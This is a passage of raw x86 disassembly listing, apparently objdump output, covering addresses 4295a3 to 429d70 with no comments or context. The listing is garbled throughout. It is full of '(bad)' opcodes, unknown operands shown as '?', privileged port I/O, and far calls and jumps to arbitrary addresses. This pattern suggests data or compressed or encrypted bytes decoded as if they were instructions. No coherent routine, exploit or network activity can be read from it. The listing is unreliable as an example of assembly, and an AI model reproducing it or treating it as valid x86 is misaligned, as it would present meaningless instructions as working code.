  4295a3:	mov    dl,0x53
  4295a5:	shl    BYTE PTR [ecx+0x76af0b29],1
  4295ab:	sub    eax,0x7ebf6821
  4295b0:	mov    bh,0x5
  4295b2:	mov    esp,DWORD PTR [edi+0x42d330aa]
  4295b8:	(bad)  [eax+0x7a]
  4295bb:	int3   
  4295bc:	rcr    BYTE PTR [edi],cl
  4295be:	add    al,0x3f
  4295c0:	xor    BYTE PTR [ecx-0x6164ee45],0x2e
  4295c7:	ret    
  4295c8:	dec    edi
  4295c9:	stos   DWORD PTR es:[edi],eax
  4295ca:	push   ebp
  4295cb:	push   edx
  4295cc:	in     eax,dx
  4295cd:	jmp    0x429623
  4295cf:	mov    ebp,0x848ad515
  4295d4:	pop    ds
  4295d5:	cmp    BYTE PTR [eax+eiz*1-0x4dad1adf],al
  4295dc:	and    BYTE PTR [esi+esi*1-0xd],al
  4295e0:	shl    BYTE PTR es:[ebx+edx*4+0x56de1c99],cl
  4295e8:	pop    ecx
  4295e9:	mov    esi,0xa9645a77
  4295ee:	rol    BYTE PTR [ebx-0x307d17c7],cl
  4295f4:	inc    edx
  4295f5:	test   DWORD PTR [edi-0x74bd94b4],0x86c8659b
  4295ff:	xor    esp,esp
  429601:	mov    ch,0x3d
  429603:	rcl    DWORD PTR [edi+eiz*2],0x5c
  429607:	sub    cl,bl
  429609:	cld    
  42960a:	cwde   
  42960b:	pop    esp
  42960c:	xor    eax,ecx
  42960e:	dec    esi
  42960f:	push   eax
  429610:	test   BYTE PTR [ebx],0x70
  429613:	iret   
  429614:	inc    esi
  429615:	out    dx,al
  429616:	mov    gs,WORD PTR [ecx+ebp*2]
  429619:	xchg   DWORD PTR [esi-0x20770af],ebx
  42961f:	push   ds
  429620:	dec    ebp
  429621:	add    BYTE PTR [ebx+edx*4+0x59df1000],cl
  429628:	mov    bh,0xc6
  42962a:	mov    DWORD PTR [edi],edx
  42962c:	push   0x2e
  42962e:	dec    esp
  42962f:	shl    cl,1
  429631:	push   ss
  429632:	ins    BYTE PTR es:[edi],dx
  429633:	shr    BYTE PTR [edi],0xce
  429636:	xchg   esi,eax
  429637:	icebp  
  429638:	inc    eax
  429639:	int3   
  42963a:	test   BYTE PTR [edi],bl
  42963c:	mov    ss,WORD PTR [edi]
  42963e:	shl    eax,1
  429640:	adc    al,0xce
  429642:	pop    ebp
  429643:	xor    edi,esi
  429645:	mov    cl,0x52
  429647:	(bad)
  42964a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42964b:	pop    ss
  42964c:	and    ecx,edx
  42964e:	add    esp,DWORD PTR [edx+eiz*1-0xa]
  429652:	push   es
  429653:	leave  
  429654:	int3   
  429655:	and    al,0xa4
  429657:	adc    al,0xa1
  429659:	mov    edi,0x78c285f5
  42965e:	xor    BYTE PTR fs:[ebp-0x2cf07f12],al
  429665:	fldenv [edx]
  429667:	dec    edx
  429668:	xchg   ebp,eax
  429669:	xor    bh,BYTE PTR [esi+eiz*2-0x4d]
  42966d:	retf   0xf9ea
  429670:	stc    
  429671:	push   cs
  429672:	das    
  429673:	outs   dx,BYTE PTR ds:[esi]
  429674:	(bad)  
  429675:	iret   
  429676:	inc    eax
  429677:	pop    esi
  429678:	ror    DWORD PTR [eax],cl
  42967a:	cdq    
  42967b:	add    al,0xc0
  42967d:	ror    edi,cl
  42967f:	pop    esi
  429680:	push   edx
  429681:	(bad)  
  429682:	aas    
  429683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429684:	or     edx,eax
  429686:	mov    esp,0x38b827b6
  42968b:	mov    WORD PTR [ebx+0x15544],gs
  429691:	pop    esp
  429692:	int    0x42
  429694:	retf   
  429695:	fldenv [ecx+0x2c]
  429698:	sar    DWORD PTR [eax],1
  42969a:	(bad)  
  42969b:	pop    ecx
  42969c:	or     al,0x6c
  42969e:	xchg   ebp,eax
  42969f:	mov    dh,0x40
  4296a1:	ja     0x42962c
  4296a3:	or     ebp,edi
  4296a5:	ins    BYTE PTR es:[edi],dx
  4296a6:	test   BYTE PTR [ebx+0x24],ah
  4296a9:	test   ecx,edi
  4296ab:	lds    esp,FWORD PTR [edx+0x4cc007da]
  4296b1:	mov    al,0x5e
  4296b3:	sbb    al,0x4
  4296b5:	test   DWORD PTR [esi-0x1],edx
  4296b8:	or     eax,0x515e5ed2
  4296bd:	push   0x48
  4296bf:	fimul  DWORD PTR ss:[ecx-0x3e]
  4296c3:	outs   dx,BYTE PTR ds:[esi]
  4296c4:	pop    ss
  4296c5:	dec    ecx
  4296c6:	pushf  
  4296c7:	in     al,dx
  4296c8:	push   0xfffffff0
  4296ca:	shl    BYTE PTR [esi+0x72],1
  4296cd:	arpl   WORD PTR [ebx-0x3c],si
  4296d0:	xchg   BYTE PTR [ebp+0x2f],cl
  4296d3:	lahf   
  4296d4:	inc    edx
  4296d5:	shr    ebp,1
  4296d7:	(bad)  
  4296d8:	aas    
  4296d9:	push   es
  4296da:	sbb    esp,ecx
  4296dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4296dd:	dec    ebp
  4296de:	std    
  4296df:	and    ebx,edx
  4296e1:	adc    al,0xc6
  4296e3:	inc    esp
  4296e4:	pop    ebp
  4296e5:	and    al,0x41
  4296e7:	fcom   QWORD PTR [ebx+0x24]
  4296ea:	aad    0x44
  4296ec:	in     eax,dx
  4296ed:	aaa    
  4296ee:	and    DWORD PTR [eax],esp
  4296f0:	jl     0x4296aa
  4296f2:	ror    DWORD PTR ds:0x6987297f,cl
  4296f8:	adc    dh,BYTE PTR [eax]
  4296fa:	stc    
  4296fb:	sub    ebp,DWORD PTR [ecx+0x5b86bb15]
  429701:	xor    esp,DWORD PTR ds:0xce666f16
  429708:	jno    0x429740
  42970a:	neg    bh
  42970c:	xor    esp,esi
  42970e:	stc    
  42970f:	sbb    esi,ebx
  429711:	sbb    al,BYTE PTR [eax+eax*4+0x449d62fb]
  429718:	xchg   ebx,ebx
  42971a:	add    al,0xff
  42971c:	pop    esi
  42971d:	mov    dl,0x4d
  42971f:	ja     0x4296f4
  429721:	xor    eax,0xb2aab7fe
  429726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429727:	outs   dx,BYTE PTR es:[esi]
  429729:	fisttp WORD PTR [ebp+0x744c4753]
  42972f:	clc    
  429730:	dec    ebp
  429731:	sub    BYTE PTR [ebx],ch
  429733:	es mov ch,0x3c
  429736:	xor    eax,0x77fd5046
  42973b:	out    0xc6,eax
  42973d:	xor    BYTE PTR [edi-0x4b2beeb8],bl
  429743:	stos   BYTE PTR es:[edi],al
  429744:	int    0x2a
  429746:	sub    dh,0x0
  429749:	jmp    0xf0a5:0x499ff348
  429750:	mov    ds:0xd3022cd6,eax
  429755:	sub    DWORD PTR [ebx+eiz*8],edi
  429758:	in     al,dx
  429759:	rol    DWORD PTR [esi-0xd],0x2
  42975d:	sahf   
  42975e:	stos   BYTE PTR es:[edi],al
  42975f:	test   cl,ah
  429761:	mov    WORD PTR [eax-0xee91e98],?
  429767:	in     al,0x99
  429769:	xor    al,0x92
  42976b:	mov    bl,0xb
  42976d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42976e:	add    eax,0x440ce882
  429773:	rol    DWORD PTR [edi+0x36],1
  429776:	in     al,dx
  429777:	popa   
  429778:	mov    bl,0x43
  42977a:	int    0xff
  42977c:	fisttp WORD PTR [eax+0x2]
  42977f:	jo     0x4297d9
  429781:	mov    al,0x23
  429783:	out    0x73,eax
  429785:	or     bl,dl
  429787:	outs   dx,BYTE PTR ds:[esi]
  429788:	repnz cmp ebp,DWORD PTR [edx+0x28a8986a]
  42978f:	adc    edi,DWORD PTR [ebx+eiz*1-0x6ad7657f]
  429796:	popa   
  429797:	and    edx,DWORD PTR [eax+edx*1-0x4a]
  42979b:	or     ecx,DWORD PTR [edi-0x44c1eab3]
  4297a1:	push   ebp
  4297a2:	ins    DWORD PTR es:[edi],dx
  4297a3:	xchg   edx,eax
  4297a4:	imul   esp,DWORD PTR [esi+0x7972c7bf],0x71cf49dc
  4297ae:	mov    BYTE PTR [edi+edi*4-0x35],ch
  4297b2:	shr    BYTE PTR [ecx],1
  4297b4:	mov    al,ds:0xe4609ad2
  4297b9:	add    ebx,DWORD PTR [ecx+eax*4-0x62]
  4297bd:	ret    0x74cb
  4297c0:	(bad)  
  4297c1:	pushf  
  4297c2:	inc    ebp
  4297c3:	addr16 xor cl,ah
  4297c6:	xchg   ebx,eax
  4297c7:	mov    cl,0x61
  4297c9:	inc    esi
  4297ca:	adc    bh,BYTE PTR [edx-0x1]
  4297cd:	aas    
  4297ce:	inc    esi
  4297cf:	add    bl,BYTE PTR [eax*2-0x11fef5cf]
  4297d6:	jle    0x4297a4
  4297d8:	jne    0x4297cf
  4297da:	in     al,dx
  4297db:	pop    es
  4297dc:	nop
  4297dd:	mov    ch,0xdf
  4297df:	push   edi
  4297e0:	rcl    DWORD PTR [edi-0x58e13d64],1
  4297e6:	jns    0x4297fc
  4297e8:	cmp    al,0x8
  4297ea:	dec    ebp
  4297eb:	rcl    BYTE PTR [ebx+0x3900f887],1
  4297f1:	or     eax,0x77fb8bbf
  4297f6:	(bad)  [esi*8+0x7d1709ff]
  4297fd:	stos   BYTE PTR es:[edi],al
  4297fe:	rol    DWORD PTR [esi+0x3ee9d36f],1
  429804:	inc    edi
  429805:	jecxz  0x4297c3
  429807:	sub    eax,0x64d98562
  42980c:	lds    ebx,FWORD PTR [eax-0x27]
  42980f:	and    BYTE PTR [esi-0x4e],0x97
  429813:	push   edi
  429814:	int    0xcc
  429816:	arpl   WORD PTR [ebp+0x46],bp
  429819:	and    ecx,0xfffffff4
  42981c:	adc    BYTE PTR [esi-0x61a70d26],dh
  429822:	test   esi,ebx
  429824:	xor    BYTE PTR [ebx+0x2cac809d],dl
  42982a:	mov    eax,0x8c3b0e9b
  42982f:	call   FWORD PTR [edx+edi*8+0x517bb59c]
  429836:	push   ebx
  429837:	add    BYTE PTR [esi+0x1e],0x46
  42983b:	into   
  42983c:	add    eax,esp
  42983e:	out    0xe7,eax
  429840:	jae    0x429864
  429842:	(bad)  
  429843:	sbb    dl,bl
  429845:	add    al,0x0
  429847:	xchg   esp,ecx
  429849:	out    dx,eax
  42984a:	aad    0xfc
  42984c:	add    BYTE PTR [ebx],dl
  42984e:	call   0x8971:0x7b0e9800
  429855:	adc    BYTE PTR [ebx+0x3d],ah
  429858:	fdecstp 
  42985a:	push   ss
  42985b:	mov    dl,0xe7
  42985d:	iret   
  42985e:	and    eax,0xc7abb82a
  429863:	mov    ?,WORD PTR [edi-0x42]
  429866:	xchg   edx,eax
  429867:	and    esp,DWORD PTR [ecx+0x2e]
  42986a:	mov    eax,ds:0xddc36fc1
  42986f:	adc    ebx,DWORD PTR [ecx]
  429871:	add    al,0x7a
  429873:	mov    esp,0xff369d78
  429878:	jg     0x429886
  42987a:	out    0xb0,al
  42987c:	and    esp,DWORD PTR [eax+0x43]
  42987f:	and    ebp,DWORD PTR ds:0xf340a54c
  429885:	loope  0x429894
  429887:	xchg   edx,eax
  429888:	sub    DWORD PTR [esi+edx*2+0x4d],ebx
  42988c:	iret   
  42988d:	ins    BYTE PTR es:[edi],dx
  42988e:	pop    esi
  42988f:	cmp    BYTE PTR [ebp+0x4cdb0f69],bl
  429895:	cmp    BYTE PTR [ebp+0x37a7e130],bl
  42989b:	mov    bh,0xa2
  42989d:	test   edx,0x1068e408
  4298a3:	xor    eax,0xff7fab32
  4298a8:	jl     0x429869
  4298aa:	jp     0x429902
  4298ac:	fsubr  DWORD PTR [edi]
  4298ae:	les    ecx,FWORD PTR [esi-0xf0009c0]
  4298b4:	sahf   
  4298b5:	push   eax
  4298b6:	mov    ds:0x5931ac00,eax
  4298bb:	adc    esi,eax
  4298bd:	bound  eax,QWORD PTR [esi]
  4298bf:	mov    eax,ds:0xcb727797
  4298c4:	addr16 loope 0x4298ca
  4298c7:	mov    eax,0xe8475e8f
  4298cc:	add    edx,DWORD PTR [esi-0x46a2e878]
  4298d2:	mov    bh,BYTE PTR [edx+0x10]
  4298d5:	push   esp
  4298d6:	adc    cl,BYTE PTR [ecx]
  4298d8:	lahf   
  4298d9:	adc    eax,0x600fa24b
  4298de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298df:	sub    BYTE PTR [ecx-0x6e],0xd8
  4298e3:	or     eax,DWORD PTR [edx*2+0x6098cf5f]
  4298ea:	and    cl,BYTE PTR [ecx+0xe1c132d]
  4298f0:	jns    0x42989d
  4298f2:	fs sti 
  4298f4:	retf   0x6878
  4298f7:	pushf  
  4298f8:	xor    al,0xbc
  4298fa:	xlat   BYTE PTR ds:[ebx]
  4298fb:	mov    bl,BYTE PTR [edi+0x7aa2b98]
  429901:	fcom   DWORD PTR [edi+edx*8-0x7d]
  429905:	push   esi
  429906:	outs   dx,DWORD PTR ds:[esi]
  429907:	xchg   esi,eax
  429908:	push   ss
  429909:	mov    DWORD PTR [esi-0x3e6e325],0xaefdfd0b
  429913:	es aaa 
  429915:	mov    ss,WORD PTR [ecx]
  429917:	push   0xfffffff8
  429919:	hlt    
  42991a:	push   es
  42991b:	pop    ds
  42991c:	in     al,dx
  42991d:	repz sub DWORD PTR [esi+eax*8+0x57cc2812],esp
  429925:	aam    0x54
  429927:	loopne 0x429942
  429929:	ret    
  42992a:	inc    esi
  42992b:	out    0x42,eax
  42992d:	mov    al,ds:0x5574f434
  429932:	div    BYTE PTR [esi+0x33]
  429935:	lods   eax,DWORD PTR ds:[esi]
  429936:	xor    eax,0x865c33fb
  42993b:	lahf   
  42993c:	ins    DWORD PTR es:[edi],dx
  42993d:	call   0xd184:0x8774fb40
  429944:	mov    WORD PTR [esi+eiz*2+0x10dfadf6],fs
  42994b:	(bad)
  42994e:	cmp    esp,esp
  429950:	imul   esi,DWORD PTR [ebp+0xabede7b],0x88ddb5f2
  42995a:	xchg   ebx,eax
  42995b:	ins    DWORD PTR es:[edi],dx
  42995c:	mov    ebp,0x53053678
  429961:	push   ebx
  429962:	or     BYTE PTR [esi+ecx*1+0x11],dh
  429966:	mov    al,ds:0x3307992f
  42996b:	sub    BYTE PTR [ebp+0x2e],cl
  42996e:	shl    DWORD PTR [ecx-0x70a87bd6],0x2e
  429975:	mov    al,ds:0xad8a2ba7
  42997a:	(bad)  
  42997c:	add    al,0xfb
  42997e:	iret   
  42997f:	xchg   ebx,eax
  429980:	push   esp
  429981:	mov    dh,0xe2
  429983:	jl     0x429956
  429985:	mov    ss,WORD PTR [ebx+0x75cc18be]
  42998b:	popa   
  42998c:	mov    dh,bh
  42998e:	sub    al,0x35
  429990:	xchg   edx,eax
  429991:	jmp    0x995d:0xaf015cd1
  429998:	rcr    DWORD PTR ds:0x298223b4,0x7
  42999f:	mov    esi,0x5f04df52
  4299a4:	cmp    BYTE PTR [eax+0x51479a36],cl
  4299aa:	or     ah,ah
  4299ac:	push   ecx
  4299ad:	dec    eax
  4299ae:	retf   0x1217
  4299b1:	sbb    BYTE PTR [edx],ch
  4299b3:	adc    BYTE PTR [edx],al
  4299b5:	mov    al,ds:0x9416e59d
  4299ba:	push   ecx
  4299bb:	mov    ds:0x4cbac448,al
  4299c0:	sub    DWORD PTR ds:0x9168b736,0x5e4cc6fd
  4299ca:	dec    ebp
  4299cb:	add    al,0x12
  4299cd:	aad    0x83
  4299cf:	test   eax,0xd8f782a2
  4299d4:	stos   BYTE PTR es:[edi],al
  4299d5:	call   0x4b332e26
  4299da:	mov    esp,0x1625157a
  4299df:	fwait
  4299e0:	add    BYTE PTR [ecx+edx*8-0x59a19e74],ch
  4299e7:	or     al,0xf3
  4299e9:	imul   esi,DWORD PTR [ebx+0x17],0xdb040ed6
  4299f0:	mov    edi,0x661b24c6
  4299f5:	inc    esi
  4299f6:	bound  eax,QWORD PTR [edi]
  4299f8:	pop    eax
  4299f9:	adc    eax,0x3b0d317a
  4299fe:	pop    edx
  4299ff:	sbb    DWORD PTR [esi-0x4d],ecx
  429a02:	cdq    
  429a03:	lds    edi,FWORD PTR [ebx-0x79]
  429a06:	popf   
  429a07:	imul   ecx,DWORD PTR [esi+ebp*1+0x2b],0x41
  429a0c:	nop    DWORD PTR [edx]
  429a0f:	rcr    BYTE PTR [ebx+0x3f0cba6a],1
  429a15:	lds    edi,FWORD PTR [edi-0x7dc4e906]
  429a1b:	repz gs cwde 
  429a1e:	inc    ebx
  429a1f:	push   esi
  429a20:	int3   
  429a21:	ins    DWORD PTR es:[edi],dx
  429a22:	test   al,0xc7
  429a24:	outs   dx,DWORD PTR ds:[esi]
  429a25:	daa    
  429a26:	imul   ebx,DWORD PTR [eax+0x74d456ac],0xfffffff1
  429a2d:	and    cl,bl
  429a2f:	(bad)  
  429a30:	in     eax,0xbc
  429a32:	or     al,0x17
  429a34:	mov    eax,ds:0x909bab01
  429a39:	sar    cl,0x9
  429a3c:	fcomp  QWORD PTR [ecx-0x9085552]
  429a42:	ror    ch,cl
  429a44:	popf   
  429a45:	mov    ch,0xe5
  429a47:	addr16 jge 0x429a58
  429a4a:	retf   
  429a4b:	inc    ebp
  429a4c:	arpl   WORD PTR [edi+edx*2-0x646b9cc8],di
  429a53:	data16 jb 0x429a6e
  429a56:	(bad)  
  429a57:	bsr    ecx,ecx
  429a5a:	lock sahf 
  429a5c:	xchg   ecx,eax
  429a5d:	or     cl,ch
  429a5f:	fsub   DWORD PTR [ecx]
  429a61:	mov    bh,ch
  429a63:	adc    eax,DWORD PTR [esi-0x5e]
  429a66:	push   eax
  429a67:	and    ecx,DWORD PTR [edi+0x24]
  429a6a:	ja     0x429a41
  429a6c:	data16 add al,0x70
  429a6f:	xchg   edi,eax
  429a70:	jnp    0x429a6b
  429a72:	dec    DWORD PTR [eax+eax*1-0xdf0ae2e]
  429a79:	jle    0x429aa2
  429a7b:	stos   BYTE PTR es:[edi],al
  429a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a7d:	sub    bh,BYTE PTR [esi+0x3f]
  429a80:	pop    ebx
  429a81:	lds    esi,FWORD PTR ds:0x2dc7ffb4
  429a87:	popa   
  429a88:	in     al,0x2a
  429a8a:	cmp    esp,edx
  429a8c:	int3   
  429a8d:	push   esi
  429a8e:	(bad)  
  429a90:	loope  0x429a16
  429a92:	imul   esi,DWORD PTR [edx+0x11],0x55
  429a96:	pop    edx
  429a97:	out    0xef,eax
  429a99:	dec    edi
  429a9a:	push   ss
  429a9b:	push   ebp
  429a9c:	clc    
  429a9d:	and    DWORD PTR [edx],ecx
  429a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429aa0:	inc    esp
  429aa1:	mov    edi,0x99097380
  429aa6:	adc    al,0x41
  429aa8:	dec    ebp
  429aa9:	in     eax,dx
  429aaa:	call   0x8ab9:0x94788925
  429ab1:	xor    eax,0x4ba70884
  429ab6:	adc    ah,dh
  429ab8:	push   0x6f6cfcc3
  429abd:	and    esi,DWORD PTR [esi]
  429abf:	or     al,0x4e
  429ac1:	inc    ecx
  429ac2:	outs   dx,BYTE PTR ds:[esi]
  429ac3:	lods   eax,DWORD PTR ds:[esi]
  429ac4:	xor    DWORD PTR [esi+eax*8+0x75bf278b],0x5c
  429acc:	cmp    eax,0x5c073cfc
  429ad1:	and    bl,BYTE PTR [esi-0x3667192e]
  429ad7:	arpl   WORD PTR [ebp-0x33ed7e60],sp
  429add:	dec    eax
  429ade:	xchg   ebx,eax
  429adf:	int    0xe1
  429ae1:	aas    
  429ae2:	icebp  
  429ae3:	bound  ebx,QWORD PTR [edx+0x70]
  429ae6:	out    dx,al
  429ae7:	clc    
  429ae8:	jp     0x429af5
  429aea:	mov    ebp,0xffd1f6ce
  429aef:	repz mov ah,0xb4
  429af2:	or     eax,DWORD PTR [ebp+0x14]
  429af5:	imul   esi,DWORD PTR [ebx-0x71d21176],0xe1f80d7d
  429aff:	mov    cl,0x45
  429b01:	hlt    
  429b02:	stc    
  429b03:	stos   BYTE PTR es:[edi],al
  429b04:	mov    al,0x78
  429b06:	mov    ebp,0xc39fd938
  429b0b:	or     ebx,DWORD PTR [ecx+0x5]
  429b0e:	bswap  ecx
  429b10:	push   ebp
  429b11:	int3   
  429b12:	rcr    bh,cl
  429b14:	addr16 jmp 0x27173a48
  429b1a:	in     al,dx
  429b1b:	xlat   BYTE PTR ds:[ebx]
  429b1c:	in     eax,dx
  429b1d:	add    al,0x59
  429b1f:	inc    esi
  429b20:	xor    ebp,edx
  429b22:	push   es
  429b23:	stc    
  429b24:	pushf  
  429b25:	lds    eax,FWORD PTR [ecx]
  429b27:	outs   dx,DWORD PTR ds:[esi]
  429b28:	les    ebp,FWORD PTR [ecx-0x1593c3ea]
  429b2e:	mov    al,ah
  429b30:	not    DWORD PTR [edi]
  429b32:	push   ss
  429b33:	rol    BYTE PTR [edx+0x68],1
  429b36:	bound  esi,QWORD PTR [edi+ebx*2]
  429b39:	(bad)
  429b3c:	cli    
  429b3d:	rcl    DWORD PTR [ecx-0x33],1
  429b40:	pusha  
  429b41:	mov    dx,0xd480
  429b45:	push   eax
  429b46:	out    0xaa,al
  429b48:	push   edx
  429b49:	loopne 0x429b8a
  429b4b:	out    0x7e,eax
  429b4d:	out    0x44,eax
  429b4f:	es push cs
  429b51:	dec    ebx
  429b52:	icebp  
  429b53:	xchg   BYTE PTR [edi+0x48],ah
  429b56:	jmp    0x11f789de
  429b5b:	jecxz  0x429b35
  429b5d:	inc    ebx
  429b5e:	scas   eax,DWORD PTR es:[edi]
  429b5f:	mov    bh,0xaf
  429b61:	and    DWORD PTR ss:[ebp+0x2a2a5456],edx
  429b68:	xchg   edi,eax
  429b69:	inc    ebx
  429b6a:	clc    
  429b6b:	fisub  WORD PTR [esp+ecx*1+0x26]
  429b6f:	push   ebp
  429b70:	pop    ds
  429b71:	sbb    al,0x2
  429b73:	add    al,0xb1
  429b75:	mov    bl,0xf1
  429b77:	in     eax,0x50
  429b79:	dec    ecx
  429b7a:	les    ebp,FWORD PTR [edi]
  429b7c:	sub    al,dl
  429b7e:	xchg   esi,eax
  429b7f:	sbb    eax,0x388d1526
  429b84:	mov    esi,0xe8bae822
  429b89:	xchg   edi,eax
  429b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b8b:	jo     0x429baa
  429b8d:	pop    edx
  429b8e:	mov    dl,0x73
  429b90:	jo     0x429b63
  429b92:	out    dx,al
  429b93:	xchg   ebx,eax
  429b94:	dec    eax
  429b95:	mov    al,0x9d
  429b97:	int3   
  429b98:	aam    0xc1
  429b9a:	mov    dl,0xaa
  429b9c:	pop    es
  429b9d:	mov    esi,0x47c4662d
  429ba2:	adc    ecx,DWORD PTR [eax]
  429ba4:	adc    BYTE PTR [edx-0x77c2c167],bl
  429baa:	rol    ecx,0x22
  429bad:	(bad)  
  429bae:	push   edi
  429baf:	adc    al,0xfc
  429bb1:	inc    bx
  429bb3:	pop    ss
  429bb4:	scas   al,BYTE PTR es:[edi]
  429bb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429bb6:	and    eax,0xc016d0dc
  429bbb:	adc    al,0x99
  429bbd:	adc    DWORD PTR [esi],edx
  429bbf:	xchg   ecx,eax
  429bc0:	pop    ecx
  429bc1:	dec    eax
  429bc2:	call   0x24c5:0x336924fd
  429bc9:	jecxz  0x429b91
  429bcb:	jp     0x429bff
  429bcd:	adc    ebp,eax
  429bcf:	cmp    ebx,DWORD PTR [esi-0x6e]
  429bd2:	in     al,0x23
  429bd4:	adc    eax,0xca56c3b
  429bd9:	push   esi
  429bda:	mov    ecx,0x74eaec24
  429bdf:	and    dl,BYTE PTR [edi+0x24b82121]
  429be5:	arpl   WORD PTR [edi+edx*2],sp
  429be8:	inc    esi
  429be9:	cwde   
  429bea:	mov    ah,0xc4
  429bec:	cmp    eax,0x9da22d6
  429bf1:	jne    0x429bb0
  429bf3:	xor    al,0x5c
  429bf5:	push   esi
  429bf6:	out    0x66,eax
  429bf8:	les    esp,FWORD PTR [eax+0x63d04af1]
  429bfe:	jmp    FWORD PTR [ecx+0x6d]
  429c01:	sar    ebp,0x9a
  429c04:	data16 lods al,BYTE PTR ds:[esi]
  429c06:	sbb    DWORD PTR [esi-0x4],0x23
  429c0a:	(bad)  
  429c0b:	jle    0x429c4e
  429c0d:	adc    eax,DWORD PTR [esp+ebx*2]
  429c10:	in     al,dx
  429c11:	ret    
  429c12:	(bad)  
  429c13:	clc    
  429c14:	cmp    ebp,esp
  429c16:	aas    
  429c17:	loopne 0x429c4b
  429c19:	fnstcw WORD PTR [esp+esi*8]
  429c1c:	mov    eax,0xf8ed3338
  429c21:	mov    al,ds:0x4cfe0423
  429c26:	dec    eax
  429c27:	adc    eax,DWORD PTR [edx]
  429c29:	pop    esi
  429c2a:	call   0x846ec1a8
  429c2f:	add    ebx,edx
  429c31:	mov    ebx,edi
  429c33:	not    DWORD PTR [eax+0x24d60c36]
  429c39:	fdiv   DWORD PTR [ebx]
  429c3b:	push   ebp
  429c3c:	cwde   
  429c3d:	pushf  
  429c3e:	push   ss
  429c3f:	mov    esp,0x738f5ddc
  429c44:	and    eax,0x9842039a
  429c49:	add    DWORD PTR fs:[ebx-0x14257d63],ebp
  429c50:	sbb    al,0x2a
  429c52:	addr16 pop esi
  429c54:	and    bl,BYTE PTR [ebx-0x7f]
  429c57:	iret   
  429c58:	arpl   bp,ax
  429c5a:	sub    edx,DWORD PTR [edi+0x687ff1a7]
  429c60:	scas   al,BYTE PTR es:[edi]
  429c61:	add    al,0x45
  429c63:	(bad)  
  429c64:	popf   
  429c65:	aad    0x1a
  429c67:	ins    BYTE PTR es:[edi],dx
  429c68:	xchg   ebp,eax
  429c69:	in     eax,0x7d
  429c6b:	lock inc edi
  429c6d:	call   0xcca4fdf
  429c72:	jecxz  0x429cdb
  429c74:	mov    ds:0xd8b86350,al
  429c79:	dec    eax
  429c7a:	sbb    edi,eax
  429c7c:	sbb    DWORD PTR fs:[ebx+esi*8-0xd],ebp
  429c81:	cmp    BYTE PTR [eax+edx*8-0x55],bl
  429c85:	call   0xd128f962
  429c8a:	sub    bh,dh
  429c8c:	shl    BYTE PTR [esi+esi*2+0x60],cl
  429c90:	jno    0x429ce8
  429c92:	add    al,0x1a
  429c94:	mov    eax,0x2c00435b
  429c99:	add    ah,al
  429c9b:	aas    
  429c9c:	jnp    0x429c35
  429c9e:	movsx  ebp,WORD PTR [edi]
  429ca1:	pop    eax
  429ca2:	lock data16 stos BYTE PTR es:[edi],al
  429ca5:	or     BYTE PTR [ebp+0x74],0xb0
  429ca9:	pop    ss
  429caa:	sbb    BYTE PTR [esi],0xf5
  429cad:	shl    BYTE PTR [ebp-0x7a],1
  429cb0:	in     eax,dx
  429cb1:	test   al,0x25
  429cb3:	push   ss
  429cb4:	ror    DWORD PTR [ebp+0x66],1
  429cb7:	iret   
  429cb8:	retf   
  429cb9:	push   esi
  429cba:	aas    
  429cbb:	sahf   
  429cbc:	mov    esp,0x76bf8130
  429cc1:	pop    ebx
  429cc2:	xor    DWORD PTR [ecx-0x58],eax
  429cc5:	pusha  
  429cc6:	pushf  
  429cc7:	push   es
  429cc8:	aaa    
  429cc9:	call   0xc84:0x35fd9793
  429cd0:	add    eax,0x42c84287
  429cd5:	ret    0x4cd0
  429cd8:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  429cda:	inc    esp
  429cdb:	out    0xab,al
  429cdd:	lds    eax,FWORD PTR [ebx-0x2e0589b9]
  429ce3:	xor    eax,0xdf9a80b5
  429ce8:	dec    ebx
  429ce9:	or     BYTE PTR [eax-0x3e],al
  429cec:	xor    edi,DWORD PTR [edi+0x1a]
  429cef:	pop    eax
  429cf0:	jmp    0x9a1f6291
  429cf5:	sbb    al,0x5
  429cf7:	popa   
  429cf8:	jg     0x429d53
  429cfa:	xchg   ebp,eax
  429cfb:	add    eax,0x4e141f00
  429d00:	pmulhw mm6,QWORD PTR [ecx+edx*2-0x32]
  429d05:	out    dx,al
  429d06:	adc    al,BYTE PTR [ebx]
  429d08:	ins    DWORD PTR es:[edi],dx
  429d09:	xchg   esi,ebx
  429d0b:	icebp  
  429d0c:	cmc    
  429d0d:	jbe    0x429d89
  429d0f:	adc    DWORD PTR [ecx+esi*1+0x2875dde2],0xffffffa4
  429d17:	repz mov eax,0xb798f64c
  429d1d:	push   eax
  429d1e:	rcr    edx,0xeb
  429d21:	mov    ds:0xcb691df8,eax
  429d26:	fcmovnbe st,st(6)
  429d28:	mov    ecx,0xe1ab9e90
  429d2d:	icebp  
  429d2e:	loope  0x429d34
  429d30:	ss cs adc al,0xb0
  429d34:	stos   BYTE PTR es:[edi],al
  429d35:	cdq    
  429d36:	mov    ah,0x3f
  429d38:	popa   
  429d39:	xor    DWORD PTR [ebx],ecx
  429d3b:	popf   
  429d3c:	push   esi
  429d3d:	rcr    esi,0x7a
  429d40:	xchg   esp,eax
  429d41:	cs sbb al,0xa1
  429d44:	xlat   BYTE PTR ds:[ebx]
  429d45:	inc    edi
  429d46:	jmpw   0x706a
  429d4a:	mov    ds:0xc767dcfe,al
  429d4f:	mov    WORD PTR [edx-0x3f],fs
  429d52:	mov    es,WORD PTR [edx+0x1]
  429d55:	dec    edi
  429d56:	dec    ebx
  429d57:	ss xor al,0x44
  429d5a:	jge    0x429d4c
  429d5c:	adc    BYTE PTR [edi+ebx*1],ch
  429d5f:	leave  
  429d60:	adc    al,0xf0
  429d62:	aaa    
  429d63:	pop    ebp
  429d64:	push   ds
  429d65:	in     al,dx
  429d66:	mov    al,0x95
  429d68:	xchg   ecx,eax
  429d69:	and    DWORD PTR [ebx+0x79],eax
  429d6c:	cld    
  429d6d:	shl    ah,0x4a
  429d70:	and    BYTE PTR es:[ebx],dh
